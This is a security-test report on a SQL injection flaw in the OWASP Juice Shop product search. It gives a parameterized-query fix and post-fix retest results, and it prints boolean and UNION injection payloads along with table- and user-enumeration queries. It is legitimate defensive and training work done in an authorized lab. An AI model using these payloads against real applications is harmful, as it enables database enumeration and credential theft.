# SQLI-002 — Product Search SQL Injection

**Application:** OWASP Juice Shop
**Classification:** CWE-89 / OWASP WSTG-INPV-05
**Severity:** Critical (preliminary; CVSS not calculated)
**Status:** Remediated and retested
**Environment:** Authorized Docker laboratory

## Executive Summary

The public product search allowed SQL query manipulation and unauthorized access to other tables.

## Vulnerable Endpoint

`GET /rest/products/search?q=...`

## Root Cause and Remediation

The original query interpolated user input into SQL. The patch below replaces interpolation with a bound parameter.

### Verified source-code patch

~~~diff
--- a/routes/search.ts
+++ b/routes/search.ts
@@ -20,7 +20,14 @@
   return (req: Request, res: Response, next: NextFunction) => {
     let criteria: any = req.query.q === 'undefined' ? '' : req.query.q ?? ''
     criteria = (criteria.length <= 200) ? criteria : criteria.substring(0, 200)
-    models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`) // vuln-code-snippet vuln-line unionSqlInjectionChallenge dbSchemaChallenge
+    models.sequelize.query(
+      "SELECT * FROM Products WHERE ((name LIKE $search OR description LIKE $search) AND deletedAt IS NULL) ORDER BY name",
+      {
+        bind: {
+          search: "%" + String(criteria) + "%"
+        }
+      }
+    ) // vuln-code-snippet vuln-line unionSqlInjectionChallenge dbSchemaChallenge
       .then(([products]: any) => {
         const dataString = JSON.stringify(products)
         if (challengeUtils.notSolved(challenges.unionSqlInjectionChallenge)) { // vuln-code-snippet hide-start
~~~

## Proof of Concept

### Boolean-based SQL Injection

~~~sql
apple')) OR 1=1--
~~~
Observed: HTTP 200, 56 products.

~~~sql
apple')) OR 1=2--
~~~
Observed: HTTP 200, 0 products.

### UNION-based SQL Injection

~~~sql
apple')) UNION SELECT 999999,'SQLI_002_CONFIRMED','TESTE_CONTROLADO',0,0,0,0,0,0,0--
~~~
Observed: HTTP 200, artificial product marker returned.

## Database Exposure

Testing identified 22 tables, 13 Users columns and 24 users. Five records and five password hashes were retrieved during controlled testing.

~~~sql
SELECT name FROM sqlite_master WHERE type='table';
SELECT name FROM pragma_table_info('Users');
SELECT COUNT(*) FROM Users;
~~~

No personal information or recovered password hashes are published.

## Post-remediation Validation

The query was fixed using bind parameters. Legitimate search returned 3 products; tested SQLi vectors returned 0.

| Test | HTTP | Result |
|---|---:|---|
| Legitimate search | 200 | 3 products |
| Boolean SQLi | 200 | 0 products |
| UNION SQLi | 200 | 0 products |
| Users table access attempt | 200 | 0 products |

SQLI-001 regression tests returned HTTP 401 without tokens.

## Additional Finding

Unsalted MD5 password hashing is documented separately as CRYPTO-001; remediation remains pending.

## Scope and Limitations

Testing was limited to authorized Docker containers. Validation covers the tested vectors, not every possible attack.

## References

CWE-89; OWASP WSTG-INPV-05; OWASP Juice Shop.
